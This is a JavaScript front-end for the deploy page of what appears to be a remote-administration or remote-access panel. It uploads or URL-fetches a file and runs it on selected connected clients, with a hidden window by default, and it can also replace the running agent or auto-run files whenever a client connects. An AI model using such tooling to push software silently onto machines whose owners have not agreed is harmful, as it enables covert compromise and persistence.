import { escapeHtml, formatBytes } from "./format.js";

const clientList = document.getElementById("client-list");
const clientSearch = document.getElementById("client-search");
const osFilter = document.getElementById("os-filter");
const selectAllBtn = document.getElementById("select-all-btn");
const clearSelectionBtn = document.getElementById("clear-selection-btn");
const selectedCountSpan = document.getElementById("selected-count");
const uploadZone = document.getElementById("upload-zone");
const uploadInput = document.getElementById("upload-input");
const uploadStatus = document.getElementById("upload-status");
const osBadge = document.getElementById("os-badge");
const execArgsInput = document.getElementById("exec-args");
const hideWindowToggle = document.getElementById("hide-window-toggle");
const executeBtn = document.getElementById("execute-btn");
const updateBtn = document.getElementById("update-btn");
const outputContainer = document.getElementById("output-container");
const clearOutputBtn = document.getElementById("clear-output-btn");

const tabUpload = document.getElementById("tab-upload");
const tabUrl = document.getElementById("tab-url");
const panelUpload = document.getElementById("panel-upload");
const panelUrl = document.getElementById("panel-url");
const urlInput = document.getElementById("url-input");
const fetchUrlBtn = document.getElementById("fetch-url-btn");

let activeTab = "upload";

function switchTab(tab) {
  activeTab = tab;
  if (tab === "upload") {
    tabUpload.classList.add("bg-slate-700", "text-slate-100");
    tabUpload.classList.remove("text-slate-400");
    tabUrl.classList.remove("bg-slate-700", "text-slate-100");
    tabUrl.classList.add("text-slate-400");
    panelUpload.classList.remove("hidden");
    panelUrl.classList.add("hidden");
  } else {
    tabUrl.classList.add("bg-slate-700", "text-slate-100");
    tabUrl.classList.remove("text-slate-400");
    tabUpload.classList.remove("bg-slate-700", "text-slate-100");
    tabUpload.classList.add("text-slate-400");
    panelUrl.classList.remove("hidden");
    panelUpload.classList.add("hidden");
  }
}

tabUpload.addEventListener("click", () => switchTab("upload"));
tabUrl.addEventListener("click", () => switchTab("url"));

let allClients = [];
let filteredClients = [];
const selectedClients = new Set();
let uploaded = null;
let allowedOs = "unknown";

async function checkAuth() {
  try {
    const res = await fetch("/api/auth/me");
    if (!res.ok) {
      window.location.href = "/";
      return;
    }

    const data = await res.json();
    const permissions = Array.isArray(data.permissions) ? data.permissions : [];
    const hasPermission = (permission) => permissions.includes(permission);
    document.getElementById("username-display").textContent = data.username;

    const roleBadge = document.getElementById("role-badge");
    const roleBadges = {
      admin: '<i class="fa-solid fa-crown mr-1"></i>Admin',
      operator: '<i class="fa-solid fa-sliders mr-1"></i>Operator',
      viewer: '<i class="fa-solid fa-eye mr-1"></i>Viewer',
    };
    if (roleBadges[data.role]) {
      roleBadge.innerHTML = roleBadges[data.role];
    } else {
      roleBadge.textContent = data.role || "";
    }

    if (data.role === "admin") {
      roleBadge.classList.add(
        "bg-purple-900/50",
        "text-purple-300",
        "border",
        "border-purple-800",
      );
      if (hasPermission("audit:view")) document.getElementById("metrics-link")?.classList.remove("hidden");
      if (hasPermission("scripts:manage")) document.getElementById("scripts-link")?.classList.remove("hidden");
      if (hasPermission("clients:build") || data.canBuild) document.getElementById("build-link")?.classList.remove("hidden");
      if (hasPermission("users:manage")) document.getElementById("users-link")?.classList.remove("hidden");
      if (hasPermission("plugins:manage")) document.getElementById("plugins-link")?.classList.remove("hidden");
      if (hasPermission("deploys:manage")) document.getElementById("deploy-link")?.classList.remove("hidden");
    } else if (data.role === "operator") {
      roleBadge.classList.add(
        "bg-blue-900/50",
        "text-blue-300",
        "border",
        "border-blue-800",
      );
    } else {
      roleBadge.classList.add(
        "bg-slate-700",
        "text-slate-300",
        "border",
        "border-slate-600",
      );
    }

    if (!hasPermission("deploys:manage")) {
      alert("Access denied. Missing deploys:manage permission.");
      window.location.href = "/";
    }
  } catch (err) {
    console.error("Auth check failed:", err);
    window.location.href = "/";
  }
}

async function loadClients() {
  try {
    const res = await fetch("/api/clients?pageSize=10000");
    if (!res.ok) throw new Error("Failed to load clients");

    const data = await res.json();
    allClients = data.items.filter((c) => c.online);

    if (allClients.length === 0) {
      clientList.innerHTML =
        '<div class="p-4 text-center text-slate-500">No online clients available</div>';
      return;
    }

    const osList = new Set(allClients.map((c) => c.os || "unknown"));
    osFilter.innerHTML =
      '<option value="all">All OS (' +
      allClients.length +
      ")</option>" +
      Array.from(osList)
        .sort()
        .map((os) => {
          const count = allClients.filter((c) => (c.os || "unknown") === os)
            .length;
          return `<option value="${escapeHtml(os)}">${escapeHtml(os)} (${count})</option>`;
        })
        .join("");

    filterAndRenderClients();
    preselectClientFromQuery();
  } catch (error) {
    console.error("Failed to load clients:", error);
    clientList.innerHTML =
      '<div class="p-4 text-center text-red-400">Error loading clients</div>';
  }
}

function preselectClientFromQuery() {
  const params = new URLSearchParams(window.location.search);
  const targetId = params.get("clientId");
  if (!targetId) return;
  if (allClients.some((c) => c.id === targetId)) {
    selectedClients.add(targetId);
    renderClients();
  }
}

function filterAndRenderClients() {
  const searchTerm = clientSearch.value.toLowerCase();
  const osValue = osFilter.value;

  filteredClients = allClients.filter((c) => {
    const matchesSearch =
      !searchTerm ||
      (c.host && c.host.toLowerCase().includes(searchTerm)) ||
      c.id.toLowerCase().includes(searchTerm) ||
      (c.os && c.os.toLowerCase().includes(searchTerm)) ||
      (c.user && c.user.toLowerCase().includes(searchTerm)) ||
      (c.nickname && c.nickname.toLowerCase().includes(searchTerm));

    const matchesOs = osValue === "all" || (c.os || "unknown") === osValue;

    const matchesUploadOs = matchesClientOs(c.os || "", allowedOs);

    return matchesSearch && matchesOs && matchesUploadOs;
  });

  renderClients();
}

function renderClients() {
  if (filteredClients.length === 0) {
    clientList.innerHTML =
      '<div class="p-4 text-center text-slate-500">No clients match your filters</div>';
    return;
  }

  clientList.innerHTML = filteredClients
    .map((c) => {
      const name = c.host || c.id.substring(0, 8);
      const os = c.os || "unknown";
      const isSelected = selectedClients.has(c.id);

      return `
      <label class="flex items-center gap-3 px-4 py-3 hover:bg-slate-800/50 cursor-pointer border-b border-slate-800 last:border-b-0" data-client-id="${escapeHtml(c.id)}">
        <input type="checkbox" class="client-checkbox w-4 h-4 rounded border-slate-600 bg-slate-700 checked:bg-cyan-600" data-id="${escapeHtml(c.id)}" ${
          isSelected ? "checked" : ""
        }>
        <div class="flex-1 min-w-0">
          <div class="font-semibold text-slate-100 truncate">${escapeHtml(
            name,
          )}</div>
          <div class="text-sm text-slate-400 flex items-center gap-2">
            <span>${escapeHtml(os)}</span>
            ${c.user ? `<span class="text-slate-500">• ${escapeHtml(c.user)}</span>` : ""}
            <span class="text-slate-600">• ${c.id.substring(0, 8)}</span>
          </div>
        </div>
        <div class="text-emerald-400 text-sm">
          <i class="fa-solid fa-circle text-xs"></i> Online
        </div>
      </label>
    `;
    })
    .join("");

  clientList.querySelectorAll(".client-checkbox").forEach((cb) => {
    cb.addEventListener("change", handleClientToggle);
  });

  updateSelectedCount();
}

function handleClientToggle(e) {
  const clientId = e.target.dataset.id;
  if (e.target.checked) {
    selectedClients.add(clientId);
  } else {
    selectedClients.delete(clientId);
  }
  updateSelectedCount();
}

function updateSelectedCount() {
  selectedCountSpan.textContent = `${selectedClients.size} selected`;
  executeBtn.disabled = selectedClients.size === 0 || !uploaded;
  if (updateBtn) {
    updateBtn.disabled = selectedClients.size === 0 || !uploaded;
  }
}

function normalizeClientOs(os) {
  const val = String(os || "").toLowerCase();
  if (val.includes("windows")) return "windows";
  if (val.includes("darwin") || val.includes("mac")) return "mac";
  if (val.includes("linux")) return "linux";
  return "unknown";
}

function matchesClientOs(clientOs, targetOs) {
  if (!targetOs || targetOs === "unknown") return true;
  if (targetOs === "unix") {
    const norm = normalizeClientOs(clientOs);
    return norm === "linux" || norm === "mac";
  }
  return normalizeClientOs(clientOs) === targetOs;
}

function setUploadStatus(text, tone = "text-slate-400") {
  uploadStatus.className = `mt-3 text-sm ${tone}`;
  uploadStatus.textContent = text;
}

function setOsBadge(os) {
  const label = os === "unknown" ? "not detected" : os === "unix" ? "mac/linux" : os;
  osBadge.textContent = `OS: ${label}`;
  osBadge.classList.remove("border-emerald-600", "text-emerald-300", "border-amber-600", "text-amber-300");
  if (os === "unknown") return;
  osBadge.classList.add("border-emerald-600", "text-emerald-300");
}

clientSearch.addEventListener("input", filterAndRenderClients);
osFilter.addEventListener("change", filterAndRenderClients);

selectAllBtn.addEventListener("click", () => {
  filteredClients.forEach((c) => selectedClients.add(c.id));
  renderClients();
});

clearSelectionBtn.addEventListener("click", () => {
  selectedClients.clear();
  renderClients();
});

uploadZone.addEventListener("click", () => uploadInput.click());
uploadZone.addEventListener("dragover", (event) => {
  event.preventDefault();
  uploadZone.classList.add("border-cyan-500");
});
uploadZone.addEventListener("dragleave", () => {
  uploadZone.classList.remove("border-cyan-500");
});
uploadZone.addEventListener("drop", async (event) => {
  event.preventDefault();
  uploadZone.classList.remove("border-cyan-500");
  const file = event.dataTransfer?.files?.[0];
  if (file) {
    await uploadFile(file);
  }
});
uploadInput.addEventListener("change", async (event) => {
  const file = event.target.files?.[0];
  if (file) {
    await uploadFile(file);
  }
});

async function uploadFile(file) {
  setUploadStatus(`Uploading ${file.name}...`, "text-blue-400");
  executeBtn.disabled = true;

  try {
    const form = new FormData();
    form.append("file", file, file.name);
    const res = await fetch("/api/deploy/upload", {
      method: "POST",
      body: form,
    });

    if (!res.ok) {
      const text = await res.text();
      setUploadStatus(text || "Upload failed", "text-red-400");
      return;
    }

    const data = await res.json();
    if (!data.ok) {
      setUploadStatus(data.error || "Upload failed", "text-red-400");
      return;
    }

      uploaded = data;
      allowedOs = data.os || "unknown";
      const sizeBytes = Number(data.size ?? file.size ?? 0);
      setUploadStatus(`Uploaded ${data.name} (${formatBytes(sizeBytes)})`, "text-emerald-400");
      setOsBadge(allowedOs);

      filterAndRenderClients();
      Array.from(selectedClients).forEach((clientId) => {
        const client = allClients.find((c) => c.id === clientId);
        if (!client || !matchesClientOs(client.os || "", allowedOs)) {
          selectedClients.delete(clientId);
        }
      });
      renderClients();
      updateSelectedCount();
  } catch (error) {
    console.error("Upload failed:", error);
    setUploadStatus("Upload failed", "text-red-400");
  }
}

async function fetchFromUrl() {
  const rawUrl = urlInput.value.trim();
  if (!rawUrl) {
    setUploadStatus("Please enter a URL", "text-red-400");
    return;
  }

  setUploadStatus("Downloading from URL...", "text-blue-400");
  fetchUrlBtn.disabled = true;
  executeBtn.disabled = true;

  try {
    const res = await fetch("/api/deploy/fetch-url", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url: rawUrl }),
    });

    if (!res.ok) {
      const text = await res.text();
      setUploadStatus(text || "Fetch failed", "text-red-400");
      return;
    }

    const data = await res.json();
    if (!data.ok) {
      setUploadStatus(data.error || "Fetch failed", "text-red-400");
      return;
    }

    uploaded = data;
    allowedOs = data.os || "unknown";
    const sizeBytes = Number(data.size ?? 0);
    setUploadStatus(`Fetched ${data.name} (${formatBytes(sizeBytes)})`, "text-emerald-400");
    setOsBadge(allowedOs);

    filterAndRenderClients();
    Array.from(selectedClients).forEach((clientId) => {
      const client = allClients.find((c) => c.id === clientId);
      if (!client || !matchesClientOs(client.os || "", allowedOs)) {
        selectedClients.delete(clientId);
      }
    });
    renderClients();
    updateSelectedCount();
  } catch (error) {
    console.error("URL fetch failed:", error);
    setUploadStatus("Fetch failed", "text-red-400");
  } finally {
    fetchUrlBtn.disabled = false;
  }
}

fetchUrlBtn.addEventListener("click", fetchFromUrl);
urlInput.addEventListener("keydown", (e) => {
  if (e.key === "Enter") fetchFromUrl();
});

executeBtn.addEventListener("click", async () => {
  if (selectedClients.size === 0) {
    alert("Please select at least one client");
    return;
  }

  if (!uploaded?.uploadId) {
    alert("Please upload an installer first");
    return;
  }

  const args = execArgsInput.value.trim();
  const hideWindow = hideWindowToggle?.checked !== false;

  executeBtn.disabled = true;
  const clientIds = Array.from(selectedClients);
  outputContainer.innerHTML = `<div class="text-blue-400">Dispatching to ${clientIds.length} client(s)...</div>`;

  let results = [];
  try {
    const res = await fetch("/api/deploy/run", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        uploadId: uploaded.uploadId,
        clientIds,
        args,
        hideWindow,
      }),
    });

    if (!res.ok) {
      results = clientIds.map((clientId) => ({
        clientId,
        error: `HTTP error! status: ${res.status}`,
      }));
    } else {
      const data = await res.json();
      if (!data.ok) {
        results = clientIds.map((clientId) => ({
          clientId,
          error: data.error || "Unknown error",
        }));
      } else {
        results = (data.results || []).map((result) => ({
          clientId: result.clientId,
          ok: result.ok,
          reason: result.reason,
          command: result.command,
        }));
      }
    }
  } catch (error) {
    results = clientIds.map((clientId) => ({
      clientId,
      error: error.message,
    }));
  }

  const namedResults = results.map((r) => {
    const client = allClients.find((c) => c.id === r.clientId);
    const clientName = client
      ? client.host || r.clientId.substring(0, 8)
      : r.clientId.substring(0, 8);
    if (r.error) {
      return { clientName, clientId: r.clientId, error: r.error };
    }
    if (r.ok === false) {
      return { clientName, clientId: r.clientId, error: r.reason || "Dispatch failed" };
    }
    return { clientName, clientId: r.clientId, output: "Uploaded and execution started", command: r.command };
  });

  outputContainer.innerHTML = namedResults
    .map((r) => {
      if (r.error) {
        return `<div class="mb-4 pb-4 border-b border-slate-800 last:border-b-0">
        <div class="text-cyan-400 font-semibold mb-2">━━━ ${escapeHtml(
          r.clientName,
        )} (${escapeHtml(r.clientId.substring(0, 8))}) ━━━</div>
        <div class="text-red-400">Error: ${escapeHtml(r.error)}</div>
      </div>`;
      }
      const commandLine = r.command
        ? `<div class="text-slate-400 text-sm mb-2">Command: ${escapeHtml(r.command)}</div>`
        : "";
      return `<div class="mb-4 pb-4 border-b border-slate-800 last:border-b-0">
      <div class="text-cyan-400 font-semibold mb-2">━━━ ${escapeHtml(
        r.clientName,
      )} (${escapeHtml(r.clientId.substring(0, 8))}) ━━━</div>
      ${commandLine}
      <div class="text-slate-100">${escapeHtml(r.output)}</div>
    </div>`;
    })
    .join("");

  executeBtn.disabled = false;
});

if (updateBtn) {
  updateBtn.addEventListener("click", async () => {
    if (selectedClients.size === 0) {
      alert("Please select at least one client");
      return;
    }

    if (!uploaded?.uploadId) {
      alert("Please upload an installer first");
      return;
    }

    if (!confirm("Replace the running agent on selected clients?")) {
      return;
    }

    updateBtn.disabled = true;
    const clientIds = Array.from(selectedClients);
    outputContainer.innerHTML = `<div class="text-blue-400">Dispatching update to ${clientIds.length} client(s)...</div>`;

    let results = [];
    try {
      const res = await fetch("/api/deploy/update", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          uploadId: uploaded.uploadId,
          clientIds,
        }),
      });

      if (!res.ok) {
        results = clientIds.map((clientId) => ({
          clientId,
          error: `HTTP error! status: ${res.status}`,
        }));
      } else {
        const data = await res.json();
        if (!data.ok) {
          results = clientIds.map((clientId) => ({
            clientId,
            error: data.error || "Unknown error",
          }));
        } else {
          results = (data.results || []).map((result) => ({
            clientId: result.clientId,
            ok: result.ok,
            reason: result.reason,
          }));
        }
      }
    } catch (error) {
      results = clientIds.map((clientId) => ({
        clientId,
        error: error.message,
      }));
    }

    const namedResults = results.map((r) => {
      const client = allClients.find((c) => c.id === r.clientId);
      const clientName = client
        ? client.host || r.clientId.substring(0, 8)
        : r.clientId.substring(0, 8);
      if (r.error) {
        return { clientName, clientId: r.clientId, error: r.error };
      }
      if (r.ok === false) {
        return { clientName, clientId: r.clientId, error: r.reason || "Update failed" };
      }
      return { clientName, clientId: r.clientId, output: "Update dispatched" };
    });

    outputContainer.innerHTML = namedResults
      .map((r) => {
        if (r.error) {
          return `<div class="mb-4 pb-4 border-b border-slate-800 last:border-b-0">
          <div class="text-cyan-400 font-semibold mb-2">━━━ ${escapeHtml(
            r.clientName,
          )} (${escapeHtml(r.clientId.substring(0, 8))}) ━━━</div>
          <div class="text-red-400">Error: ${escapeHtml(r.error)}</div>
        </div>`;
        }
        return `<div class="mb-4 pb-4 border-b border-slate-800 last:border-b-0">
        <div class="text-cyan-400 font-semibold mb-2">━━━ ${escapeHtml(
          r.clientName,
        )} (${escapeHtml(r.clientId.substring(0, 8))}) ━━━</div>
        <div class="text-slate-100">${escapeHtml(r.output)}</div>
      </div>`;
      })
      .join("");

    updateBtn.disabled = false;
  });
}

clearOutputBtn.addEventListener("click", () => {
  outputContainer.innerHTML =
    '<div class="text-slate-500">No commands dispatched yet.</div>';
});

const autoDeployNameInput = document.getElementById("auto-deploy-name");
const autoDeployTriggerSelect = document.getElementById("auto-deploy-trigger");
const autoDeployZone = document.getElementById("auto-deploy-zone");
const autoDeployFileInput = document.getElementById("auto-deploy-file-input");
const autoDeployFileStatus = document.getElementById("auto-deploy-file-status");
const autoDeployArgsInput = document.getElementById("auto-deploy-args");
const autoDeployHideWindow = document.getElementById("auto-deploy-hide-window");
const autoDeploySaveBtn = document.getElementById("auto-deploy-save-btn");
const autoDeployCancelBtn = document.getElementById("auto-deploy-cancel-btn");
const autoDeployList = document.getElementById("auto-deploy-list");

let autoDeployFile = null;
let autoDeployEditId = null;

if (autoDeployZone) {
  autoDeployZone.addEventListener("click", () => autoDeployFileInput.click());
  autoDeployZone.addEventListener("dragover", (e) => {
    e.preventDefault();
    autoDeployZone.classList.add("border-cyan-500");
  });
  autoDeployZone.addEventListener("dragleave", () => {
    autoDeployZone.classList.remove("border-cyan-500");
  });
  autoDeployZone.addEventListener("drop", (e) => {
    e.preventDefault();
    autoDeployZone.classList.remove("border-cyan-500");
    const f = e.dataTransfer?.files?.[0];
    if (f) {
      autoDeployFile = f;
      autoDeployFileStatus.textContent = `${f.name} (${formatBytes(f.size)})`;
      autoDeployFileStatus.className = "mt-1 text-xs text-emerald-400";
    }
  });
  autoDeployFileInput.addEventListener("change", (e) => {
    const f = e.target.files?.[0];
    if (f) {
      autoDeployFile = f;
      autoDeployFileStatus.textContent = `${f.name} (${formatBytes(f.size)})`;
      autoDeployFileStatus.className = "mt-1 text-xs text-emerald-400";
    }
  });
}

function getAutoDeployOsFilter() {
  const checked = [];
  document.querySelectorAll('input[name="auto-deploy-os"]:checked').forEach((cb) => {
    checked.push(cb.value);
  });
  return checked;
}

function clearAutoDeployOsFilter() {
  document.querySelectorAll('input[name="auto-deploy-os"]').forEach((cb) => {
    cb.checked = false;
  });
}

function resetAutoDeployForm() {
  autoDeployNameInput.value = "";
  autoDeployTriggerSelect.value = "on_connect";
  autoDeployArgsInput.value = "";
  autoDeployHideWindow.checked = true;
  autoDeployFile = null;
  autoDeployFileInput.value = "";
  autoDeployFileStatus.textContent = "No file selected";
  autoDeployFileStatus.className = "mt-1 text-xs text-slate-400";
  clearAutoDeployOsFilter();
  autoDeployEditId = null;
  autoDeployCancelBtn.classList.add("hidden");
  autoDeploySaveBtn.innerHTML = '<i class="fa-solid fa-bolt"></i> Save Auto Start';
}

async function loadAutoDeploys() {
  try {
    const res = await fetch("/api/auto-deploys");
    if (!res.ok) return;
    const data = await res.json();
    renderAutoDeployList(data.items || []);
  } catch (err) {
    console.error("Failed to load auto deploys:", err);
  }
}

function triggerLabel(trigger) {
  switch (trigger) {
    case "on_connect": return "Every connect";
    case "on_connect_once": return "Once per client";
    case "on_first_connect": return "First connect only";
    default: return trigger;
  }
}

function renderAutoDeployList(items) {
  if (items.length === 0) {
    autoDeployList.innerHTML = '<div class="text-slate-500 text-sm">No auto start rules configured.</div>';
    return;
  }

  autoDeployList.innerHTML = items
    .map((item) => {
      const osText = item.osFilter && item.osFilter.length > 0
        ? item.osFilter.join(", ")
        : "any";
      const statusColor = item.enabled ? "text-emerald-400" : "text-slate-500";
      const statusIcon = item.enabled ? "fa-circle-check" : "fa-circle-pause";
      return `
        <div class="flex items-center justify-between p-3 rounded-lg border border-slate-800 bg-slate-950/60" data-id="${escapeHtml(item.id)}">
          <div class="flex-1 min-w-0">
            <div class="flex items-center gap-2">
              <i class="fa-solid ${statusIcon} ${statusColor} text-sm"></i>
              <span class="font-semibold text-slate-100 text-sm truncate">${escapeHtml(item.name)}</span>
            </div>
            <div class="text-xs text-slate-400 mt-1 flex flex-wrap gap-x-3">
              <span><i class="fa-solid fa-file mr-1"></i>${escapeHtml(item.fileName)}</span>
              <span><i class="fa-solid fa-bolt mr-1"></i>${triggerLabel(item.trigger)}</span>
              <span><i class="fa-solid fa-desktop mr-1"></i>${escapeHtml(osText)}</span>
              ${item.args ? `<span><i class="fa-solid fa-terminal mr-1"></i>${escapeHtml(item.args)}</span>` : ""}
            </div>
          </div>
          <div class="flex items-center gap-2 ml-3 shrink-0">
            <button class="auto-deploy-toggle px-2 py-1 rounded text-xs ${item.enabled ? 'bg-amber-700 hover:bg-amber-600' : 'bg-emerald-700 hover:bg-emerald-600'} text-white" data-id="${escapeHtml(item.id)}" data-enabled="${item.enabled}">
              ${item.enabled ? '<i class="fa-solid fa-pause"></i>' : '<i class="fa-solid fa-play"></i>'}
            </button>
            <button class="auto-deploy-delete px-2 py-1 rounded text-xs bg-red-800 hover:bg-red-700 text-white" data-id="${escapeHtml(item.id)}">
              <i class="fa-solid fa-trash"></i>
            </button>
          </div>
        </div>`;
    })
    .join("");

  autoDeployList.querySelectorAll(".auto-deploy-toggle").forEach((btn) => {
    btn.addEventListener("click", async () => {
      const id = btn.dataset.id;
      const currentlyEnabled = btn.dataset.enabled === "true";
      try {
        const res = await fetch(`/api/auto-deploys/${encodeURIComponent(id)}`, {
          method: "PUT",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ enabled: !currentlyEnabled }),
        });
        if (res.ok) loadAutoDeploys();
      } catch (err) {
        console.error("Toggle failed:", err);
      }
    });
  });

  autoDeployList.querySelectorAll(".auto-deploy-delete").forEach((btn) => {
    btn.addEventListener("click", async () => {
      const id = btn.dataset.id;
      if (!confirm("Delete this auto start rule?")) return;
      try {
        const res = await fetch(`/api/auto-deploys/${encodeURIComponent(id)}`, {
          method: "DELETE",
        });
        if (res.ok) loadAutoDeploys();
      } catch (err) {
        console.error("Delete failed:", err);
      }
    });
  });
}

if (autoDeploySaveBtn) {
  autoDeploySaveBtn.addEventListener("click", async () => {
    const name = autoDeployNameInput.value.trim();
    if (!name) {
      alert("Please enter a task name.");
      return;
    }
    if (!autoDeployFile) {
      alert("Please select a file to deploy.");
      return;
    }

    const trigger = autoDeployTriggerSelect.value;
    const args = autoDeployArgsInput.value;
    const hideWindow = autoDeployHideWindow.checked;
    const osFilter = getAutoDeployOsFilter();

    autoDeploySaveBtn.disabled = true;

    try {
      const form = new FormData();
      form.append("file", autoDeployFile, autoDeployFile.name);
      form.append("name", name);
      form.append("trigger", trigger);
      form.append("args", args);
      form.append("hideWindow", String(hideWindow));
      form.append("enabled", "true");
      form.append("osFilter", JSON.stringify(osFilter));

      const res = await fetch("/api/auto-deploys", {
        method: "POST",
        body: form,
      });

      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        alert(data.error || "Failed to save auto start rule");
        return;
      }

      resetAutoDeployForm();
      loadAutoDeploys();
    } catch (err) {
      console.error("Save auto deploy failed:", err);
      alert("Failed to save auto start rule.");
    } finally {
      autoDeploySaveBtn.disabled = false;
    }
  });
}

if (autoDeployCancelBtn) {
  autoDeployCancelBtn.addEventListener("click", resetAutoDeployForm);
}

checkAuth();
loadClients();
loadAutoDeploys();
